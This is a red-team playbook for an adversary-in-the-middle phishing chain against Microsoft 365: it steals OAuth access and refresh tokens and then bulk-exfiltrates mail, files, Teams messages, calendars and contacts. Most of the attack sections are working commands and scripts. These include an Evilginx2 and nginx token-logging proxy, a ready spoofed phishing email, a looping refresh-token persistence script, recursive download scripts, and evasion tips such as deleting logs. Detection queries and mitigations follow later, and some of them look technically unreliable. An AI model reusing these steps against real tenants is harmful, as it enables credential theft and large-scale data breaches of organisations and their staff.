# [CHAIN-003]: Token Theft to Data Exfiltration

## Metadata

| Attribute | Details |
|---|---|
| **Chain ID** | CHAIN-003 |
| **Attack Chain Name** | OAuth Token Theft to M365 Data Exfiltration |
| **MITRE ATT&CK v18.1** | [T1528](https://attack.mitre.org/techniques/T1528/) + [T1537](https://attack.mitre.org/techniques/T1537/) |
| **Tactic** | Credential Access + Exfiltration |
| **Platforms** | M365 (Office 365, Teams, SharePoint, OneDrive) |
| **Severity** | **CRITICAL** |
| **CVE** | N/A (Token-based attacks; see related CVEs for phishing techniques) |
| **Chain Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | All M365 versions (fundamental to OAuth architecture) |
| **Execution Time** | 1-3 hours (full chain: phishing to data exfiltration) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

### Concept
This attack chain demonstrates how OAuth access and refresh tokens stolen from Microsoft 365 clients can be weaponized to exfiltrate sensitive data across the entire M365 ecosystem. Unlike credential-based attacks, stolen tokens completely bypass Multifactor Authentication (MFA), Conditional Access policies (because the initial login is legitimate), and password change events. An attacker who obtains both access tokens (short-lived, 1 hour) and refresh tokens (long-lived, days to months) can maintain persistent access to:
- Exchange Online (all emails, calendar, contacts)
- SharePoint Online (all files, collaboration data)
- OneDrive (personal documents)
- Microsoft Teams (messages, files, recordings)
- Microsoft Graph API (cross-service data aggregation)

Refresh tokens are particularly dangerous because they provide persistent access without triggering re-authentication or MFA prompts until the token expires or is revoked.

### Attack Surface
- **Email Clients:** Outlook desktop (stores tokens in DPAPI-encrypted storage)
- **Microsoft Teams:** Desktop application (tokens in SQLite Cookies database)
- **Web Browsers:** Microsoft Authenticator integration (captures OAuth tokens)
- **Adversary-in-the-Middle (AiTM) Phishing:** Tools like Evilginx2 intercept live tokens
- **Malware/EDR Evasion:** Mimikatz, browser automation frameworks can extract tokens
- **OAuth Consent Attacks:** Malicious apps trick users into granting permissions
- **API Key Exposure:** Application secrets, connection strings leaked in code/config

### Business Impact
**CRITICAL - Complete M365 Data Breach + Compliance Violation.** Attacker gains:
- **Access to all user emails** (current and historical; executives, legal dept., contracts)
- **All files in SharePoint/OneDrive** (IP, financial data, confidential projects)
- **Teams messages and file sharing** (strategic plans, secrets discussed in channels)
- **Calendar events** (M&A activity, board meetings, customer details)
- **Contact information** (customer lists, partner details for secondary attacks)

**Estimated Impact:**
- **Data Breach:** €2M-€10M in regulatory fines (GDPR, CCPA), reputational damage
- **Incident Response:** €1M-€3M (forensics, notification, credit monitoring, remediation)
- **Business Disruption:** €500K-€2M (downtime, customer churn, operational overhead)
- **Total Risk:** €3.5M-€15M depending on data sensitivity

### Technical Context
- **Detection Difficulty:** Very High (legitimate token use; harder to distinguish from normal activity)
- **Time to Extract Critical Data:** 30-60 minutes (before victim changes password or detects breach)
- **Token Lifespan:** Access tokens 1 hour; refresh tokens 24 hours to 90 days (configurable)
- **Reversibility:** Token revocation does not retroactively remove exfiltrated data

---

## 2. COMPLIANCE MAPPINGS

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmarks** | 4.1, 4.2, 5.2.1 | OAuth app permissions; token management; token lifetime |
| **DISA STIG** | AD0002, AD0028 | Privileged account monitoring; API credential protection |
| **CISA SCuBA** | CA-7, SI-4 | Session management; information system monitoring |
| **NIST 800-53** | AC-2, AC-11, SC-7, SI-4 | Account management; session locking; boundary protection; monitoring |
| **GDPR** | Art. 5, 32, 33 | Data minimization; security; breach notification |
| **DORA** | Art. 15, 16 | Incident reporting; ICT baseline requirements |
| **NIS2** | Art. 21, 23 | Cyber risk management; incident response; cyber hygiene |
| **ISO 27001** | A.6.2, A.9.2, A.12.2.3 | Token lifecycle; access control; deletion of sensitive data |
| **ISO 27005** | A.14.2.1 | Risk assessment; data exfiltration scenarios |

---

## 3. ATTACK CHAIN STAGES OVERVIEW

| Stage | Technique ID | Step Name | Duration | Key Actions |
|---|---|---|---|---|
| **Phase 1** | T1566.002 | Adversary-in-the-Middle (AiTM) Phishing Setup | 30-45 min | Deploy Evilginx2; craft phishing page |
| **Phase 2** | T1566.002 | Spear-Phishing Delivery | 1-4 hours | Deliver AiTM phishing email; trick user into MFA |
| **Phase 3** | T1528 | OAuth Token Interception | Real-time | Attacker proxies login; captures access + refresh tokens |
| **Phase 4** | T1528 | Token Validation & Refresh | 5-15 min | Test tokens; exchange refresh token for new access tokens |
| **Phase 5** | T1537 | Data Enumeration & Planning | 15-30 min | Enumerate M365 resources accessible with tokens |
| **Phase 6** | T1537 | Large-Scale Data Exfiltration | 30-60 min | Download emails, files, Teams messages, calendars |
| **Phase 7** | T1537 | Secondary Attack Preparation | 15-30 min | Extract contact info; prepare lateral movement |

---

## 4. PHASE 1: SETUP - EVILGINX2 & PHISHING INFRASTRUCTURE

### Step 1: Deploy Evilginx2 AiTM Proxy

**Objective:** Set up adversary-in-the-middle proxy to intercept OAuth login flow and capture tokens.

**Command (Linux - Evilginx2 Installation):**
```bash
# 1. Install Evilginx2
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2/
make
./bin/evilginx2 -p ./phish

# 2. Configure with valid SSL certificate (Let's Encrypt)
# Prerequisites: Domain registered (attacker-domain.com)
# Point DNS A record to attacker VPS IP

# 3. Inside Evilginx2 interactive console:
(evilginx2)> config domain attacker-domain.com
(evilginx2)> config ip <ATTACKER_VPS_IP>
(evilginx2)> config ssl

# 4. Load Office 365 phishing template (or custom)
(evilginx2)> phishlets list
(evilginx2)> phishlets enable o365
```

**Alternative: Custom AiTM Setup (Nginx + Reverse Proxy):**

```nginx
# /etc/nginx/sites-available/office365
server {
  listen 443 ssl http2;
  server_name login.attacker-domain[.]com;

  ssl_certificate /etc/letsencrypt/live/attacker-domain[.]com/fullchain.pem;
  ssl_certificate_key /etc/letsencrypt/live/attacker-domain[.]com/privkey.pem;

  # Proxy all requests to legitimate Microsoft login
  location / {
    proxy_pass https://login.microsoftonline.com;
    proxy_set_header Host login.microsoftonline.com;
    proxy_set_header X-Real-IP $remote_addr;
    
    # Intercept and log OAuth tokens from response
    proxy_pass_header Authorization;
    access_log /var/log/nginx/tokens.log full;
  }
}
```

**What This Achieves:**
- Attacker VPS now acts as man-in-the-middle between user and Microsoft
- User sees legitimate Microsoft login page (SSL certificate is valid)
- All credentials and OAuth tokens pass through attacker proxy
- Tokens are logged/captured before being forwarded to user

---

### Step 2: Create Phishing Email Template

**Objective:** Craft convincing phishing email with link to attacker's AiTM proxy.

**Phishing Email Example:**

```email
From: security-alerts@microsoft.com (spoofed or lookalike)
To: target@company.com
Subject: URGENT: Unusual sign-in activity detected - Verify your identity immediately

Body:
---

Hello,

We detected unusual sign-in activity on your Microsoft 365 account from:
- Location: Unknown location
- Device: Unrecognized device
- Time: 2024-01-10 14:23 UTC

To protect your account, we need you to verify your identity immediately.

Click the link below to verify your account:
https://login.attacker-domain[.]com/verify

If you did not attempt to sign in, please change your password immediately.

Regards,
Microsoft 365 Security Team

**Important:** This is an automated security notification. Do not reply to this email.
For more information, visit https://account.microsoft.com/security

---
```

**OpSec & Evasion:**
- Use domain lookalike (e.g., "microsoft-alert[.]top" instead of "microsoft.com")
- Or spoof company's internal domain (if email filtering allows)
- Use FIDO2-protected sending infrastructure (compromised partner account) to bypass SPF/DKIM
- Timing: Send during business hours (higher open rate)
- Target high-value accounts: Execs, finance staff, IT admins

---

## 5. PHASE 2: PHISHING DELIVERY & TOKEN INTERCEPTION

### Step 3: Victim Clicks Link & Enters Credentials

**Objective:** Victim is tricked into clicking phishing link and entering Microsoft credentials.

**User Experience (From Victim's Perspective):**
1. User receives email claiming "Unusual sign-in activity detected"
2. User clicks link (browser URL shows: `https://login.attacker-domain.com/verify`)
3. Page displays legitimate-looking Microsoft login page (because it's proxied from real Microsoft)
4. User enters username and password
5. **Browser redirects to MFA prompt** (attacker proxy intercepts)
6. User completes MFA (e.g., Authenticator app push approval)
7. User is redirected to legitimate Office 365 (attacker proxy forwarded everything)
8. **User sees legitimate Office 365 interface** (appears login was successful)
9. **Attacker has captured: username, password, MFA token, access token, refresh token**

---

### Step 4: Token Extraction & Logging

**Objective:** Attacker extracts OAuth tokens from proxy logs.

**Command (Extract Tokens from Evilginx2 Logs):**
```bash
# 1. Check captured credentials
cat evilginx2.log | grep -i "authorization" | head -20

# 2. Extract Bearer tokens
grep -oP 'Bearer \K[^"]+' evilginx2.log > tokens.txt

# 3. Extract refresh tokens (different format)
grep -oP '"refresh_token":"?\K[^"]+' evilginx2.log > refresh_tokens.txt

# Example output:
# Access Token:  eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Imk...
# Refresh Token: M.R3_BAY.XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

**Command (Validate Token Structure):**
```bash
# 1. Decode JWT access token (Base64)
echo "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Imk..." | cut -d. -f2 | base64 -d | jq .

# Expected output:
# {
#   "aud": "https://graph.microsoft.com",
#   "iss": "https://sts.windows.net/TENANT-ID/",
#   "iat": 1704883290,
#   "nbf": 1704883290,
#   "exp": 1704887190,  ← Expires in 1 hour
#   "upn": "target@company.com",
#   "roles": ["Mail.Read", "Files.Read.All"]
# }
```

**OpSec & Evasion:**
- Store tokens in encrypted file or memory-only (avoid disk logging)
- Use tokens quickly (within 1 hour before access token expiration)
- If logged to disk, encrypt with attacker's key
- Delete Evilginx2 logs after extraction

---

## 6. PHASE 3: TOKEN VALIDATION & REFRESH

### Step 5: Test Tokens & Obtain Persistent Refresh

**Objective:** Validate stolen tokens work; exchange refresh token for new access tokens to maintain persistence.

**Command (Validate Access Token):**
```bash
# 1. Test access token by making a simple Graph API call
BEARER_TOKEN="eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Imk..."

curl -X GET "https://graph.microsoft.com/v1.0/me" \
  -H "Authorization: Bearer $BEARER_TOKEN" \
  -H "Content-Type: application/json"

# Expected response:
# {
#   "id": "UUID...",
#   "displayName": "Target User",
#   "userPrincipalName": "target@company.com",
#   "mail": "target@company.com"
# }
```

### Step 6: Exchange Refresh Token for New Access Tokens

**Objective:** Using stolen refresh token, obtain new access tokens repeatedly (refresh tokens valid 24 hours to 90 days).

**Command (Get New Access Token from Refresh Token):**
```bash
# 1. Use refresh token to obtain new access token
REFRESH_TOKEN="M.R3_BAY.XXXXXXXXXXXXXXXXX..."
CLIENT_ID="04b07795-8ddb-461a-bbee-02f9e1bf7b46"  # Office app ID (public)

curl -X POST "https://login.microsoftonline.com/common/oauth2/v2.0/token" \
  -d "client_id=$CLIENT_ID" \
  -d "scope=https://graph.microsoft.com/.default" \
  -d "refresh_token=$REFRESH_TOKEN" \
  -d "grant_type=refresh_token" \
  -d "redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient"

# Expected response:
# {
#   "access_token": "NEW_ACCESS_TOKEN_VALID_1_HOUR",
#   "refresh_token": "NEW_REFRESH_TOKEN",
#   "expires_in": 3600
# }
```

**What This Means:**
- Attacker can request new access tokens **indefinitely** (refresh token lasts 24 hours to 90 days by default)
- Each new access token grants 1 hour of access
- Can chain refreshes across **90 days of undetected access**
- Even if victim changes password, refresh token remains valid (password change doesn't invalidate tokens)

**Command (Persistent Token Refresh Script):**
```python
#!/usr/bin/env python3
import requests
import json
import time

REFRESH_TOKEN = "M.R3_BAY.XXXXXXXXX..."
CLIENT_ID = "04b07795-8ddb-461a-bbee-02f9e1bf7b46"

def refresh_access_token():
    url = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
    data = {
        "client_id": CLIENT_ID,
        "scope": "https://graph.microsoft.com/.default",
        "refresh_token": REFRESH_TOKEN,
        "grant_type": "refresh_token",
        "redirect_uri": "https://login.microsoftonline.com/common/oauth2/nativeclient"
    }
    
    response = requests.post(url, data=data)
    tokens = response.json()
    
    return tokens["access_token"], tokens.get("refresh_token", REFRESH_TOKEN)

# Persistent token refresh every 50 minutes (before 1 hour expiry)
while True:
    access_token, REFRESH_TOKEN = refresh_access_token()
    print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Token refreshed. Valid for 1 hour.")
    time.sleep(3000)  # Refresh every 50 minutes
```

---

## 7. PHASE 4: DATA ENUMERATION & PLANNING

### Step 7: Enumerate M365 Resources Accessible with Tokens

**Objective:** Identify what data is accessible with stolen tokens and plan exfiltration.

**Command (Enumerate Accessible Resources):**
```bash
# 1. Get user mailbox info
curl -X GET "https://graph.microsoft.com/v1.0/me/mailFolders" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq '.value[] | {id, displayName}'

# Expected output shows folders: Inbox, Sent Items, Calendar, Tasks, etc.

# 2. Get mailbox size and message count
curl -X GET "https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messages?\$count=true&\$top=1" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq '.value | length'

# 3. Enumerate OneDrive/SharePoint drives
curl -X GET "https://graph.microsoft.com/v1.0/me/drive/root/children" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq '.value[] | {name, size}'

# 4. List all accessible SharePoint sites
curl -X GET "https://graph.microsoft.com/v1.0/me/memberOf" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq '.value[] | select(."@odata.type" == "#microsoft.graph.group") | {displayName, id}'

# 5. List Teams and channels
curl -X GET "https://graph.microsoft.com/v1.0/me/joinedTeams" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq '.value[] | {displayName, id}'
```

**Enumeration Results (Example):**
```json
Mailbox:
- Inbox: 2,451 messages
- Sent Items: 1,203 messages
- Calendar: 156 events
- Total mailbox size: 15.3 GB

OneDrive:
- Root folder: 82 files
- \Projects: 234 files (including confidential project docs)
- \Financial: 45 files (budgets, invoices)

SharePoint Sites:
- Executive Team site: 1,234 files
- Finance Collaboration: 892 files
- M&A Projects: 456 files (Confidential)

Teams:
- Executive Leadership: 4 teams, 100+ channels
- Finance: 2 teams, 50+ channels
```

**Data Classification (Targeting Strategy):**
- **High Priority (Largest Impact):** Executive emails, confidential projects, financial data
- **Medium Priority:** Customer lists, employee contact info, strategic documents
- **Low Priority:** General announcements, meeting notes

---

## 8. PHASE 5: LARGE-SCALE DATA EXFILTRATION

### Step 8: Download All Emails from Inbox

**Objective:** Extract complete email history (potentially gigabytes of data).

**Command (Export All Inbox Emails):**
```bash
#!/bin/bash
ACCESS_TOKEN="$1"
OUTPUT_DIR="./exfiltrated_data"
mkdir -p "$OUTPUT_DIR"

# 1. Get all messages (paginated)
PAGE=0
TOP=100  # 100 messages per request

while true; do
  SKIP=$((PAGE * TOP))
  RESPONSE=$(curl -s -X GET \
    "https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messages?\$skip=$SKIP&\$top=$TOP&\$select=id,subject,from,receivedDateTime,bodyPreview" \
    -H "Authorization: Bearer $ACCESS_TOKEN")
  
  # Check if more pages exist
  HAS_MORE=$(echo "$RESPONSE" | jq '.[@odata.nextLink]' -r)
  
  # Download message content for each
  echo "$RESPONSE" | jq -r '.value[] | .id' | while read MSG_ID; do
    curl -s -X GET \
      "https://graph.microsoft.com/v1.0/me/messages/$MSG_ID" \
      -H "Authorization: Bearer $ACCESS_TOKEN" | jq . > "$OUTPUT_DIR/msg_$MSG_ID.json"
  done
  
  if [ "$HAS_MORE" == "null" ]; then
    break
  fi
  PAGE=$((PAGE + 1))
done

echo "Downloaded $(find $OUTPUT_DIR -name '*.json' | wc -l) emails"
```

**Alternative: PowerShell (Export-MailExport)**
```powershell
# 1. Use Microsoft's built-in export tool (if available with stolen token)
# Note: Requires application permissions or admin consent

$token = "BEARER_TOKEN_HERE"
$headers = @{"Authorization" = "Bearer $token"}

# Request mailbox export
$body = @{
  sourceMailboxes = @("target@company.com")
  contentFilter = ""
  exportOptions = "All"
} | ConvertTo-Json

Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/compliance/ediscovery/cases/exports" `
  -Headers $headers -Method Post -Body $body -ContentType "application/json"
```

### Step 9: Download Files from OneDrive & SharePoint

**Objective:** Extract all documents (highest value data: financial, IP, strategic).

**Command (Download All Files from OneDrive):**
```bash
#!/bin/bash
ACCESS_TOKEN="$1"
DRIVE_ID=$(curl -s -X GET "https://graph.microsoft.com/v1.0/me/drive/root" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq -r '.id')

# Function to recursively download files
download_folder() {
  local FOLDER_ID=$1
  local PATH=$2
  
  # Get contents of folder
  curl -s -X GET "https://graph.microsoft.com/v1.0/me/drive/items/$FOLDER_ID/children" \
    -H "Authorization: Bearer $ACCESS_TOKEN" | jq -r '.value[] | "\(.id)|\(.name)|\(.folder)"' | while IFS="|" read ITEM_ID NAME IS_FOLDER; do
    
    if [ "$IS_FOLDER" != "null" ]; then
      # Recursively download subfolders
      mkdir -p "$PATH/$NAME"
      download_folder "$ITEM_ID" "$PATH/$NAME"
    else
      # Download file
      echo "Downloading: $PATH/$NAME"
      curl -s -X GET "https://graph.microsoft.com/v1.0/me/drive/items/$ITEM_ID/content" \
        -H "Authorization: Bearer $ACCESS_TOKEN" -o "$PATH/$NAME"
    fi
  done
}

download_folder "$DRIVE_ID" "./exfiltrated_files"
echo "OneDrive exfiltration complete"
```

**Command (Download Files from SharePoint Site):**
```bash
# 1. Get SharePoint site ID
SITE_ID=$(curl -s -X GET "https://graph.microsoft.com/v1.0/sites/company.sharepoint.com:/Finance:" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq -r '.id')

# 2. Get site drives (document libraries)
curl -s -X GET "https://graph.microsoft.com/v1.0/sites/$SITE_ID/drives" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq -r '.value[] | {id, name, webUrl}'

# 3. Download all files from each drive (repeat for each drive found)
DRIVE_ID="<DRIVE_ID>"
curl -s -X GET "https://graph.microsoft.com/v1.0/drives/$DRIVE_ID/root/children" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq -r '.value[] | .id' | while read ITEM_ID; do
  curl -X GET "https://graph.microsoft.com/v1.0/drives/$DRIVE_ID/items/$ITEM_ID/content" \
    -H "Authorization: Bearer $ACCESS_TOKEN" --output "file_$ITEM_ID"
done
```

### Step 10: Extract Teams Messages & Meeting Recordings

**Objective:** Download Teams message history and recorded meetings.

**Command (Export Teams Messages):**
```bash
# 1. Get all teams accessible to user
curl -s -X GET "https://graph.microsoft.com/v1.0/me/joinedTeams" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq -r '.value[].id' | while read TEAM_ID; do
  
  # 2. Get all channels in team
  curl -s -X GET "https://graph.microsoft.com/v1.0/teams/$TEAM_ID/channels" \
    -H "Authorization: Bearer $ACCESS_TOKEN" | jq -r '.value[].id' | while read CHANNEL_ID; do
    
    # 3. Get all messages in channel
    curl -s -X GET "https://graph.microsoft.com/v1.0/teams/$TEAM_ID/channels/$CHANNEL_ID/messages" \
      -H "Authorization: Bearer $ACCESS_TOKEN" | jq '.value[] | {from: .from.user.displayName, body: .body.content, timestamp: .createdDateTime}' > "teams_${TEAM_ID}_${CHANNEL_ID}.json"
  done
done
```

### Step 11: Extract Calendar Events & Meeting Details

**Objective:** Download calendar events (reveals business activities, M&A, partners, secrets discussed in meetings).

**Command (Export Calendar):**
```bash
# 1. Get all calendar events (next 12 months)
START_DATE=$(date -u +%Y-%m-%dT00:00:00Z)
END_DATE=$(date -u -d"+365 days" +%Y-%m-%dT00:00:00Z)

curl -s -X POST "https://graph.microsoft.com/v1.0/me/calendarview?startDateTime=$START_DATE&endDateTime=$END_DATE" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq '.value[] | {subject, start, end, attendees, bodyPreview}' > calendar_export.json

# 2. For each event, get meeting details/transcript
curl -s -X GET "https://graph.microsoft.com/v1.0/me/events" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq -r '.value[].id' | while read EVENT_ID; do
  curl -s -X GET "https://graph.microsoft.com/v1.0/me/events/$EVENT_ID" \
    -H "Authorization: Bearer $ACCESS_TOKEN" > "event_$EVENT_ID.json"
done
```

---

## 9. PHASE 6: SECONDARY ATTACK PREPARATION

### Step 12: Extract Contact Information for Lateral Movement

**Objective:** Harvest contact lists, employee info, partner contacts for secondary phishing campaigns or supply chain attacks.

**Command (Extract Contacts):**
```bash
# 1. Get contacts from personal contacts
curl -s -X GET "https://graph.microsoft.com/v1.0/me/contacts" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq '.value[] | {displayName, emailAddresses, businessPhones}' > contacts.json

# 2. Get corporate directory (if accessible)
curl -s -X GET "https://graph.microsoft.com/v1.0/users" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq '.value[] | {displayName, mail, jobTitle, officeLocation}' > corporate_directory.json

# 3. Get all external partners from SharePoint (Guest accounts, external collaborators)
curl -s -X GET "https://graph.microsoft.com/v1.0/me/memberOf" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | jq '.value[] | select(."@odata.type" == "#microsoft.graph.group") | .id' | \
  while read GROUP_ID; do
    curl -s -X GET "https://graph.microsoft.com/v1.0/groups/$GROUP_ID/members" \
      -H "Authorization: Bearer $ACCESS_TOKEN" | jq '.value[] | select(.userType == "Guest") | {displayName, mail}'
  done > external_partners.json
```

---

## 10. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**OAuth Token Indicators:**
- Successful sign-in with followed by **anomalous Graph API queries** from same IP (token reuse)
- **Refresh token exchange events** without subsequent interactive sign-in
- **Access tokens requested from non-standard clients** (curl, Python, custom tools vs. Outlook)
- **Bulk data downloads** (100+ Graph API calls to same resource in short time)

**Email Exfiltration Indicators:**
- Graph API calls to `/me/mailFolders/inbox/messages` with `$top=100+` (pagination indicating bulk export)
- **eDiscovery export requests** from non-admin accounts
- **SMTP forwarding rules** created to external addresses

**File Exfiltration Indicators:**
- OneDrive file access from **unusual IP/location** + different device
- SharePoint document bulk downloads (100+ files in < 1 hour)
- Access to files in **non-primary language** (attacker not native language user)
- **Calendar data accessed immediately after email** (pattern of comprehensive exfiltration)

**Network/Infrastructure Indicators:**
- Large data transfer to **unknown IP addresses** over HTTPS
- Connection to **anonymization services** (VPN, proxy, Tor)
- **Out-of-band communication** channel opened (Teams message to external contact, email forwarding rule)

---

### Forensic Artifacts

**Microsoft Sentinel/Unified Audit Log Queries:**

```kusto
// Find suspicious Graph API calls (bulk email export)
CloudAppEvents
| where Application == "Microsoft Graph"
| where ActionType in ("Read", "ReadMultiple")
| where ResourceName contains "mailFolders"
| where Timestamp > ago(24h)
| summarize EventCount = count() by AccountObjectId, IPAddress, ResourceName
| where EventCount > 50  // Bulk export pattern

// Find token refresh from unusual locations
SigninLogs
| where AuthenticationProtocol == "OAuth2"
| where TokenIssuerType == "AzureAD"
| where Timestamp > ago(24h)
| extend GeoDistance = geo_distance_2points(
    todynamic(format_datetime(now(), 'G')),
    todynamic(format_datetime(TimeGenerated, 'G'))
  )
| where GeoDistance > 1000  // Impossible travel: >1000km since last sign-in
```

**Exchange Online Audit Log (PowerShell):**

```powershell
# 1. Search for mailbox export/exfiltration events
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-7) `
  -EndDate (Get-Date) `
  -Operations "Export-Mailbox","MailItemsAccessed","MoveToDeletedItems" `
  -ResultSize 5000 | Select-Object TimeCreated, UserIds, Operations, ObjectId

# 2. Find forwarding rules created
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-7) `
  -Operations "New-InboxRule","Set-InboxRule" `
  -ResultSize 5000

# 3. Check for suspicious OAuth app consent
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-7) `
  -Operations "Consent to application" `
  -ResultSize 5000 | Where-Object {$_.ObjectId -notlike "*Microsoft*"}
```

---

### Defensive Mitigations

#### Priority 1: CRITICAL

**1. Implement Token Binding & Continuous Access Evaluation (CAE)**

**Manual Steps (Azure Portal):**
1. Navigate to **Entra ID** → **Manage** → **App registrations**
2. Select high-risk applications (Graph API clients, etc.)
3. Go to **API permissions**
4. Enable **Conditional Access claims**:
   - Check: "Return device properties"
   - Check: "Include certificate in response"
5. Configure **Continuous Access Evaluation (CAE)**:
   - Go to **Conditional Access** → **Session**
   - Set: **Sign-in frequency** to `1 hour`
   - Set: **Persistent browser session** to `Never`

**PowerShell:**
```powershell
Connect-MgGraph -Scopes "Application.ReadWrite.All"

# 1. Enable CAE for critical apps
$appId = "Microsoft Graph"  # example
Update-MgApplication -ApplicationId $appId -IsDeviceOnlyAuthSupported $true
```

**2. Enforce Phishing-Resistant MFA (Passwordless)**

**Manual Steps:**
1. Navigate to **Entra ID** → **Security** → **Authentication methods**
2. Enable **Windows Hello for Business** (phishing-resistant)
3. Enable **FIDO2 Security Keys** (phishing-resistant)
4. Create Conditional Access policy:
   - **Users:** All
   - **Cloud apps:** All
   - **Conditions:** Sign-in risk = High
   - **Grant:** Require phishing-resistant MFA
5. Disable weak MFA:
   - Disable SMS/Voice call MFA
   - Disable email OTP

**3. Restrict Token Lifetime & Refresh Token Rotation**

**Manual Steps:**
1. Navigate to **Entra ID** → **App registrations**
2. Select app → **Token configuration**
3. Set **Refresh token lifetime (days)** to `7` (default 90)
4. Enable **Refresh token rolling** (forces re-authentication after rotation)
5. Set **Access token lifetime (minutes)** to `30` (default 60)

**PowerShell:**
```powershell
# Set token policies globally
Update-MgPolicy -TokenLifetimePolicy @{
  AccessTokenLifetime = "PT30M"      # 30 minutes
  RefreshTokenLifetime = "P7D"       # 7 days
  RefreshTokenMaxInactiveTime = "P3D" # Expire if unused for 3 days
}
```

**4. Enable OAuth Risk Detection & Conditional Access**

**Manual Steps:**
1. Create Conditional Access policy: `Block Suspicious OAuth App Consent`
2. **Users:** All users
3. **Cloud apps:** Office 365, Microsoft Graph API
4. **Conditions:**
   - User risk: High
   - Sign-in risk: High/Medium
   - Application:** Office 365 (exclude trusted Microsoft apps)
5. **Grant:** Block access
6. **Session:** Require re-authentication every 30 minutes

**5. Monitor Graph API Usage for Exfiltration Patterns**

**Manual Steps (Microsoft Sentinel):**
1. Create custom detection rule:
   ```kusto
   CloudAppEvents
   | where Application == "Microsoft Graph"
   | where ActionType in ("FileDownloaded", "MailItemsAccessed")
   | summarize EventCount = count(), DownloadSize = sum(tolong(DataSize)) 
     by AccountObjectId, IPAddress, bin(TimeGenerated, 5m)
   | where EventCount > 100 or DownloadSize > 1000000000  // 1GB in 5 mins
   | project-rename Alert_Type = "Bulk Data Exfiltration"
   ```

---

#### Priority 2: HIGH

**6. Implement OAuth App Consent Control**

**Manual Steps:**
1. Navigate to **Entra ID** → **Security** → **Consent and permissions** → **App consent policies**
2. Set admin consent policy:
   - Only admins can consent to apps
3. Block suspicious app consent:
   - Navigate to **Dangerous apps**
   - Review "Unusual permissions" (e.g., Mail.Read All, Files.Read All for non-admin apps)
4. Configure **Conditional Access for app consent**:
   - Block consent from untrusted/new apps

**7. Deploy Data Loss Prevention (DLP) Policies**

**Manual Steps (Microsoft Purview):**
1. Go to **Data Loss Prevention** → **Policies**
2. Create policy: `Prevent Bulk Email Export`
3. Set **Pattern:** Large email exports
4. Set **Action:** Block + Alert
5. Similarly create policies for:
   - SharePoint/OneDrive bulk downloads
   - Teams message export
   - Calendar event bulk access

**8. Audit All Application Permissions**

**PowerShell (Monthly Audit):**
```powershell
# 1. List all app registrations with sensitive permissions
Get-MgApplication -All | ForEach-Object {
  $requiredPermissions = $_.RequiredResourceAccess | Where-Object {$_.ResourceAppId -eq "00000003-0000-0000-c000-000000000000"}
  
  if ($requiredPermissions.ResourceAccess.Id -contains "e1fe6dd8-ba31-4d61-89e7-88639da4683d") {  # Mail.Read.All
    Write-Host "⚠️ ALERT: $($_.DisplayName) has Mail.Read.All permission"
  }
}
```

---

### Validation Commands (Verify Mitigations)

```powershell
# 1. Verify CAE is enabled
$caePolicy = Get-MgConditionalAccessPolicy | Where-Object {$_.DisplayName -match "CAE"}
if ($caePolicy) {
  Write-Host "✅ Continuous Access Evaluation (CAE) is enabled"
} else {
  Write-Host "❌ VULNERABLE: CAE not configured"
}

# 2. Verify token lifetime is reduced
$tokenPolicy = Get-MgPolicy -TokenLifetimePolicy
if ($tokenPolicy.AccessTokenLifetime -le "PT30M") {
  Write-Host "✅ Access token lifetime is restricted to 30 minutes"
} else {
  Write-Host "❌ VULNERABLE: Access tokens expire too late"
}

# 3. Verify phishing-resistant MFA is enforced
$mfaPolicy = Get-MgIdentityConditionalAccessPolicy | Where-Object {$_.GrantControls.BuiltInControls -contains "mfa"}
if ($mfaPolicy) {
  Write-Host "✅ MFA is enforced"
} else {
  Write-Host "❌ VULNERABLE: MFA not enforced"
}

# 4. Verify OAuth app consent is restricted
$consentPolicy = Get-MgPolicyCrossTenantAccessPolicyDefault
if ($consentPolicy.B2bCollaborationOutbound.UsersAndGroups.AllowedUsers -ne "all") {
  Write-Host "✅ OAuth app consent restricted"
} else {
  Write-Host "❌ VULNERABLE: Everyone can consent to apps"
}
```

**Expected Output (If Secure):**
```
✅ Continuous Access Evaluation (CAE) is enabled
✅ Access token lifetime is restricted to 30 minutes
✅ MFA is enforced
✅ OAuth app consent restricted
```

---

## 11. RELATED ATTACK CHAINS

| Step | Phase | Technique | Attack Chain |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device Code Phishing OR [IA-PHISH-002] OAuth Consent Attack | [CHAIN-003] Token Theft to Data Exfil |
| **2** | **Credential Access** | **[T1528] Steal Application Access Token** | **Current Phase** |
| **3** | **Credential Access** | [CA-TOKEN-004] Graph API Token Theft | [CHAIN-003] Token Theft to Data Exfil |
